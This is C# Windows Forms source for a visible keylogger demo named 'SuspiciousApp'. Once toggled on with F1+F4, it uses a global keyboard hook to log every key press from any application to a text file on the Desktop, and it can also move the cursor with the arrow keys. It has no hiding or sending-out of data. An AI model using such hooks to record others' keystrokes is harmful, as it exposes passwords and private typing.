﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Utilities;
using System.IO;
using System.Threading;

namespace MyKeyhook
{
   
    public partial class SuspiciousApp : Form
    {
        Thread t;
        Boolean loggingKeys = false;
        Boolean f1 = false;
        Boolean f4 = false;
        globalKeyboardHook logAllKeysHook;
        globalKeyboardHook checkShortcut;
        globalKeyboardHook moveMouse;
        string path = Environment.GetFolderPath(System.Environment.SpecialFolder.DesktopDirectory) + "\\loggedkeys.txt";

        public SuspiciousApp()
        {
            InitializeComponent();
            logAllKeysHook = new globalKeyboardHook();
            logAllKeysHook.unhook();
            checkShortcut = new globalKeyboardHook();
            moveMouse = new globalKeyboardHook();
            labelStatus.Text = "DEACTIVATED";
            labelStatus.ForeColor = Color.Red;
            labelPath.Text = path;
            t = new Thread(new ThreadStart(writeCursor));
            t.Start();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //init all alphabet keys
            logAllKeysHook.HookedKeys.Add(Keys.A);
            logAllKeysHook.HookedKeys.Add(Keys.B);
            logAllKeysHook.HookedKeys.Add(Keys.C);
            logAllKeysHook.HookedKeys.Add(Keys.D);
            logAllKeysHook.HookedKeys.Add(Keys.E);
            logAllKeysHook.HookedKeys.Add(Keys.F);
            logAllKeysHook.HookedKeys.Add(Keys.G);
            logAllKeysHook.HookedKeys.Add(Keys.H);
            logAllKeysHook.HookedKeys.Add(Keys.I);
            logAllKeysHook.HookedKeys.Add(Keys.J);
            logAllKeysHook.HookedKeys.Add(Keys.K);
            logAllKeysHook.HookedKeys.Add(Keys.L);
            logAllKeysHook.HookedKeys.Add(Keys.M);
            logAllKeysHook.HookedKeys.Add(Keys.N);
            logAllKeysHook.HookedKeys.Add(Keys.O);
            logAllKeysHook.HookedKeys.Add(Keys.P);
            logAllKeysHook.HookedKeys.Add(Keys.Q);
            logAllKeysHook.HookedKeys.Add(Keys.R);
            logAllKeysHook.HookedKeys.Add(Keys.S);
            logAllKeysHook.HookedKeys.Add(Keys.T);
            logAllKeysHook.HookedKeys.Add(Keys.U);
            logAllKeysHook.HookedKeys.Add(Keys.V);
            logAllKeysHook.HookedKeys.Add(Keys.W);
            logAllKeysHook.HookedKeys.Add(Keys.X);
            logAllKeysHook.HookedKeys.Add(Keys.Y);
            logAllKeysHook.HookedKeys.Add(Keys.Z);
            //init number keys
            logAllKeysHook.HookedKeys.Add(Keys.D0);
            logAllKeysHook.HookedKeys.Add(Keys.D1);
            logAllKeysHook.HookedKeys.Add(Keys.D2);
            logAllKeysHook.HookedKeys.Add(Keys.D3);
            logAllKeysHook.HookedKeys.Add(Keys.D4);
            logAllKeysHook.HookedKeys.Add(Keys.D5);
            logAllKeysHook.HookedKeys.Add(Keys.D6);
            logAllKeysHook.HookedKeys.Add(Keys.D7);
            logAllKeysHook.HookedKeys.Add(Keys.D8);
            logAllKeysHook.HookedKeys.Add(Keys.D9);
            //init numpad keys
            logAllKeysHook.HookedKeys.Add(Keys.NumPad0);
            logAllKeysHook.HookedKeys.Add(Keys.NumPad1);
            logAllKeysHook.HookedKeys.Add(Keys.NumPad2);
            logAllKeysHook.HookedKeys.Add(Keys.NumPad3);
            logAllKeysHook.HookedKeys.Add(Keys.NumPad4);
            logAllKeysHook.HookedKeys.Add(Keys.NumPad5);
            logAllKeysHook.HookedKeys.Add(Keys.NumPad6);
            logAllKeysHook.HookedKeys.Add(Keys.NumPad7);
            logAllKeysHook.HookedKeys.Add(Keys.NumPad8);
            logAllKeysHook.HookedKeys.Add(Keys.NumPad9);
            logAllKeysHook.HookedKeys.Add(Keys.NumLock);
            logAllKeysHook.HookedKeys.Add(Keys.Divide);
            logAllKeysHook.HookedKeys.Add(Keys.Add);
            logAllKeysHook.HookedKeys.Add(Keys.Multiply);
            logAllKeysHook.HookedKeys.Add(Keys.Enter);
            logAllKeysHook.HookedKeys.Add(Keys.Decimal);
            //init special keys
            logAllKeysHook.HookedKeys.Add(Keys.Delete);
            logAllKeysHook.HookedKeys.Add(Keys.End);
            logAllKeysHook.HookedKeys.Add(Keys.PageDown);
            logAllKeysHook.HookedKeys.Add(Keys.PageUp);
            logAllKeysHook.HookedKeys.Add(Keys.Home);
            logAllKeysHook.HookedKeys.Add(Keys.Insert);
            //init function keys
            logAllKeysHook.HookedKeys.Add(Keys.F1);
            logAllKeysHook.HookedKeys.Add(Keys.F2);
            logAllKeysHook.HookedKeys.Add(Keys.F3);
            logAllKeysHook.HookedKeys.Add(Keys.F4);
            logAllKeysHook.HookedKeys.Add(Keys.F5);
            logAllKeysHook.HookedKeys.Add(Keys.F6);
            logAllKeysHook.HookedKeys.Add(Keys.F7);
            logAllKeysHook.HookedKeys.Add(Keys.F8);
            logAllKeysHook.HookedKeys.Add(Keys.F9);
            logAllKeysHook.HookedKeys.Add(Keys.F10);
            logAllKeysHook.HookedKeys.Add(Keys.F11);
            logAllKeysHook.HookedKeys.Add(Keys.F12);
            //init formating keys
            logAllKeysHook.HookedKeys.Add(Keys.Space);
            logAllKeysHook.HookedKeys.Add(Keys.Tab);
            logAllKeysHook.HookedKeys.Add(Keys.CapsLock);
            logAllKeysHook.HookedKeys.Add(Keys.LControlKey);
            logAllKeysHook.HookedKeys.Add(Keys.RControlKey);
            logAllKeysHook.HookedKeys.Add(Keys.LShiftKey);
            logAllKeysHook.HookedKeys.Add(Keys.RShiftKey);
            logAllKeysHook.HookedKeys.Add(Keys.LWin);
            logAllKeysHook.HookedKeys.Add(Keys.RWin);
            logAllKeysHook.HookedKeys.Add(Keys.Menu);
            logAllKeysHook.HookedKeys.Add(Keys.RMenu);
            logAllKeysHook.HookedKeys.Add(Keys.Return);
            logAllKeysHook.HookedKeys.Add(Keys.Back);
            logAllKeysHook.HookedKeys.Add(Keys.Escape);
            //init lock keys
            logAllKeysHook.HookedKeys.Add(Keys.PrintScreen);
            logAllKeysHook.HookedKeys.Add(Keys.Pause);
            logAllKeysHook.HookedKeys.Add(Keys.Scroll);

            logAllKeysHook.KeyUp += new KeyEventHandler(logAll_keyUp);

            //init shortcut key
            checkShortcut.HookedKeys.Add(Keys.F1);
            checkShortcut.HookedKeys.Add(Keys.F4);
            checkShortcut.KeyDown += new KeyEventHandler(checkShortcut_down);
            checkShortcut.KeyUp += new KeyEventHandler(checkShortcut_up);

            //init mouse move
            moveMouse.HookedKeys.Add(Keys.Up);
            moveMouse.HookedKeys.Add(Keys.Left);
            moveMouse.HookedKeys.Add(Keys.Right);
            moveMouse.HookedKeys.Add(Keys.Down);
            moveMouse.KeyDown += new KeyEventHandler(moveMouse_keydown);
        }

        void logAll_keyUp(object sender, KeyEventArgs e)
        {
            using (StreamWriter writetext = new StreamWriter(path, true))
            {
                writetext.WriteLine("Pressed\t" + e.KeyCode.ToString() + "\n");
            }
        }

        void checkShortcut_down(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.F1)
            {
                f1 = true;
            }
            if (e.KeyCode == Keys.F4)
            {
                f4 = true;   
            }
        }
        void checkShortcut_up(object sender, KeyEventArgs e)
        {
            if (f1 && f4)
            {
                toggleLog();
            }

            f1 = false;
            f4 = false;
        }

        void toggleLog()
        {
            if (!loggingKeys)
            {
                logAllKeysHook.hook();
                loggingKeys = true;
                labelStatus.ForeColor = Color.Green;
                labelStatus.Text = "ACTIVATED";
            }
            else
            {
                logAllKeysHook.unhook();
                loggingKeys = false;
                labelStatus.Text = "DEACTIVATED";
                labelStatus.ForeColor = Color.Red;
            }
        }

        void moveMouse_keydown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Up)
            {
                MoveCursor(0, 20);
            }
            if (e.KeyCode == Keys.Down)
            {
                MoveCursor(0, -20);
            }
            if (e.KeyCode == Keys.Left)
            {
                MoveCursor(20, 0);
            }
            if (e.KeyCode == Keys.Right)
            {
                MoveCursor(-20, 0);
            }
        }

        private void MoveCursor(int x, int y)
        {
            Cursor = new Cursor(Cursor.Current.Handle);
            Cursor.Position = new Point(Cursor.Position.X - x, Cursor.Position.Y - y);
        }

        void updateMouse(String s)
        {
            lblMouse.Text = s;
        }

        private void writeCursor()
        {
            while(true)
            {
                Invoke(new MethodInvoker(delegate () { updateMouse(Cursor.Position.ToString()); }));
                Thread.Sleep(100);
            }

        }

        private void SuspiciousApp_FormClosing(object sender, FormClosingEventArgs e)
        {
            t.Abort();
        }
    }
}
